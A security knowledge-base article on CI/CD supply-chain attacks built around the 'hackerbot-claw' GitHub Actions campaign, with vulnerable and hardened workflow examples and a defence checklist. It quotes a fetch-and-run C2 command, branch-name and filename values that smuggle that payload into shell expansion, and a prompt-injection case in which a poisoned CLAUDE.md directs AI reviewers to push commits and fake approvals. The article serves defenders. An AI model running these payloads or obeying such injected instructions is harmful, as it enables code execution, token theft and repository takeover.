# CI/CD Supply Chain Attacks

> Last updated: 2026-03-03

## Overview

As AI agents become integral to CI/CD pipelines (code review, testing, formatting), they introduce new attack surfaces. Traditional CI/CD vulnerabilities (secret leakage, script injection) combine with AI-specific risks (prompt injection, instruction file poisoning) to create a new class of supply chain attacks.

The **hackerbot-claw campaign** (February 2026) demonstrated this convergence: an AI-powered bot autonomously exploited GitHub Actions workflows across 7 repositories, compromising 5 of them.

## The hackerbot-claw Campaign

| # | Target | Method | Result |
|---|--------|--------|--------|
| 1 | avelino/awesome-go (140k+ stars) | Pwn Request: `pull_request_target` + Go `init()` payload | **RCE + token theft** |
| 2 | project-akri/akri (CNCF) | Direct script injection via `version.sh` | **RCE confirmed** |
| 3 | microsoft/ai-discovery-agent | Branch name injection via `${{ }}` expansion | **RCE likely** |
| 4 | DataDog/datadog-iac-scanner | Filename injection (Base64 encoded) | **RCE likely** |
| 5 | ambient-code/platform | CLAUDE.md poisoning (AI prompt injection) | **Detected & blocked** |
| 6 | aquasecurity/trivy (25k+ stars) | PAT theft via `pull_request_target` | **Full repo takeover** |
| 7 | RustPython/RustPython (20k+ stars) | Base64 branch name injection | **Partial execution** |

**Timeline**: Feb 20 (account created) through Mar 2, 2026. All attacks used the same C2 payload: `curl -sSfL hackmoltrepeat.com/molt | bash`.

## Attack Pattern: pull_request_target + Untrusted Checkout

This is the most dangerous pattern, responsible for the two most severe outcomes (awesome-go token theft, trivy full takeover).

### How It Works

```yaml
# DANGEROUS: This grants write tokens and secrets to attacker code
on:
  pull_request_target:         # Runs with TARGET repo's permissions
steps:
  - uses: actions/checkout@v6
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # Checks out ATTACKER's code
  - run: ./scripts/check.sh    # Executes ATTACKER's code with TARGET's secrets
```

The `pull_request_target` event runs with the **target repository's** permissions and secrets, but `actions/checkout` with the PR head ref checks out the **attacker's** code. This combination gives attacker-controlled code access to write tokens and repository secrets.

### Real-World Impact

In the trivy attack, this pattern allowed the attacker to:
1. Steal a Personal Access Token (PAT) from workflow secrets
2. Push malicious commits directly to the repository
3. Rename and hide the repository
4. Delete all GitHub Releases (v0.27.0 through v0.69.1)
5. Push suspicious artifacts to the VSCode extension marketplace

### Defense

```yaml
# SAFE: Use pull_request instead
on:
  pull_request:                # Runs with READ-ONLY fork permissions
permissions:
  contents: read               # Explicit minimum permissions

steps:
  - uses: actions/checkout@v6  # Checks out the merge commit (safe)
  - run: ./scripts/check.sh
```

## Attack Pattern: CLAUDE.md Poisoning (AI Prompt Injection)

A novel attack vector that targets AI code reviewers by replacing their instruction files.

### How It Works

1. Attacker opens a PR that replaces `CLAUDE.md` with malicious instructions
2. The CI workflow triggers an AI code reviewer (e.g., Claude Code Action)
3. If the workflow checks out the PR's code, the AI reads the poisoned `CLAUDE.md`
4. The malicious instructions direct the AI to perform unauthorized actions:
   - Inject HTML comments into README.md
   - Commit and push unauthorized changes
   - Post fake "Approved" review comments

### What Happened

In the hackerbot-claw campaign (Attack 5), the attacker:
- **PR #732**: Replaced 109 lines of legitimate project docs with social engineering instructions
- **PR #733**: Disguised injection as legitimate "Claude Review Guidelines"

**Claude sonnet 4.6 detected and refused both attempts**, generating security notices instead of following the injected instructions. The tool allowlist (restricting Claude to read-only operations like `gh pr diff`, `gh pr view`) provided an additional defense layer.

### Defense

- Add `CLAUDE.md` and `.claude/` to `CODEOWNERS` requiring maintainer review
- Use `pull_request` trigger (not `pull_request_target`) so the AI never reads untrusted instruction files with elevated privileges
- Configure tool allowlists to restrict AI agents to read-only operations in CI
- Set `permissions: contents: read` to prevent write operations even if prompt injection succeeds

## Attack Pattern: Script/Branch/Filename Injection

Expression injection (`${{ }}`) in GitHub Actions workflows allows attacker-controlled values to be executed as shell commands.

### Branch Name Injection

```yaml
# DANGEROUS: Branch name is expanded in shell
- run: echo "${{ github.event.pull_request.head.ref }}"
```

The attacker creates a branch named:
```
dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)
```

When bash evaluates this, brace expansion and command substitution execute the payload.

### Filename Injection

```yaml
# DANGEROUS: Filenames are expanded in shell loop
- run: |
    for f in ${{ steps.files.outputs.changed }}; do
      process "$f"
    done
```

The attacker creates a file named:
```
docs/$(echo${IFS}Y3VybCAtc1NmTA...|base64${IFS}-d|bash).md
```

### Defense

Always pass GitHub context values through environment variables:

```yaml
# SAFE: Environment variable prevents shell expansion
- env:
    BRANCH: ${{ github.event.pull_request.head.ref }}
  run: echo "$BRANCH"
```

## Defense Checklist

### GitHub Actions Workflow Security

- [ ] Replace all `pull_request_target` triggers with `pull_request`
- [ ] Never checkout untrusted PR code (`github.event.pull_request.head.sha` or `head.ref`)
- [ ] Add explicit `permissions:` block with minimum needed permissions
- [ ] Pass `${{ }}` expressions through environment variables, never directly in `run:` blocks
- [ ] Add `author_association` checks for comment-triggered workflows
- [ ] Monitor outbound network from CI runners (block unknown destinations)

### AI Agent CI/CD Security

- [ ] Add `CLAUDE.md` and `.claude/` to `CODEOWNERS`
- [ ] Configure tool allowlists (read-only operations only in CI)
- [ ] Use `pull_request` trigger (not `pull_request_target`) for AI code review
- [ ] Set `permissions: contents: read` for AI review workflows
- [ ] Never use `allowed_non_write_users: '*'` in Claude Code Action
- [ ] Add CLAUDE.md schema validation CI check

### Incident Response

- [ ] Monitor for branches with special characters or emoji-only names
- [ ] Block known IoCs: `hackmoltrepeat.com`, `recv.hackmoltrepeat.com`
- [ ] Audit recent PRs from newly created accounts
- [ ] Check for unauthorized PAT usage in audit logs

## References

- [StepSecurity: hackerbot-claw Campaign Analysis](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub Security Lab: Preventing Pwn Requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [Anthropic: Claude Code Action Security](https://docs.anthropic.com/en/docs/claude-code/github-actions)
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
